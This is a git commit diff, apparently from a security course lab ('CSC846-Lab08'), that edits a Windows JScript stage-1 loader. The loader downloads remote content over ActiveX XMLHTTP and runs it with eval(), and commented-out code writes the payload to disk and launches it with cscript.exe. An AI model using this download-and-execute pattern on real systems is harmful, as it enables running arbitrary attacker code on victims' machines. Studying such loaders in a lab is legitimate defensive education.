5500d96baa79f496e0b1b61412461d5935b8b6ce
Kevin Wafula <95890992+kwafula@users.noreply.github.com>
2025-11-06 18:01:16 -0500

    Update local_stage1.js

--- CSC846-Lab08/local_stage1.js
+++ CSC846-Lab08/local_stage1.js
@@ -26,29 +26,29 @@ try {
     var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); //Alternative// var xhr = new ActiveXObject("MSXML2.XMLHTTP");
     xhr.open("GET", remoteUrl, false); // Synchronous request
     xhr.send();
-    try {
-        if (xhr.status === 200) {
-            var stage2Content = xhr.responseText; //write_debug("stage1Content: " + stage1Content);
-            //Stage 2 Step 2: execute remoet content
+    if (xhr.status === 200) {
+        var stage2Content = xhr.responseText; //write_debug("stage1Content: " + stage1Content);
+        //Stage 2 Step 2: execute remoet content
+        try {
             eval(stage2Content);
-            // Stage 1 Step 2: Save the content to a local file
-            // var fso = new ActiveXObject("Scripting.FileSystemObject"); //write_debug("localPath: " + localPath);
-            // var file = fso.CreateTextFile(localPath, true); //
-            //file.Write(stage1Content);
-            //file.Close();
-            // Stage 1 Step 3: Execute the local file using cscript.exe. The command line to run cscript on the downloaded file
-            //var cscriptCommand = "cscript.exe //NoLogo \"" + localPath + "\"";
-            // var command = shell.Run(cscriptCommand, 1, true); // Run and wait for it to complete
-            //shell.Run(cscriptCommand, 1, true); // Run and wait for it to complete
-            write_debug("Script executed stage 2 successfully.");
-        } else {
-            write_debug("Failed to download script. Status: " + xhr.status);
+        } catch(e) {
+            write_debug("REMOTE CONTENT EVAL ERROR DETAILS:");
+            write_debug("An error code: " + e.number);
+            write_debug("An error message: " + e.message);
+            write_debug("An error description: " + e.description);
         }
-    } catch(e) {
-        write_debug("HTTP RESPONSE ERROR DETAILS:");
-        write_debug("An error code: " + e.number);
-        write_debug("An error message: " + e.message);
-        write_debug("An error description: " + e.description);
+        // Stage 1 Step 2: Save the content to a local file
+        // var fso = new ActiveXObject("Scripting.FileSystemObject"); //write_debug("localPath: " + localPath);
+        // var file = fso.CreateTextFile(localPath, true); //
+        //file.Write(stage1Content);
+        //file.Close();
+        // Stage 1 Step 3: Execute the local file using cscript.exe. The command line to run cscript on the downloaded file
+        //var cscriptCommand = "cscript.exe //NoLogo \"" + localPath + "\"";
+        // var command = shell.Run(cscriptCommand, 1, true); // Run and wait for it to complete
+        //shell.Run(cscriptCommand, 1, true); // Run and wait for it to complete
+        write_debug("Script executed stage 2 successfully.");
+    } else {
+        write_debug("Failed to download script. Status: " + xhr.status);
     }
 } catch (e) {
     write_debug("HTTP GET ERROR DETAILS:");
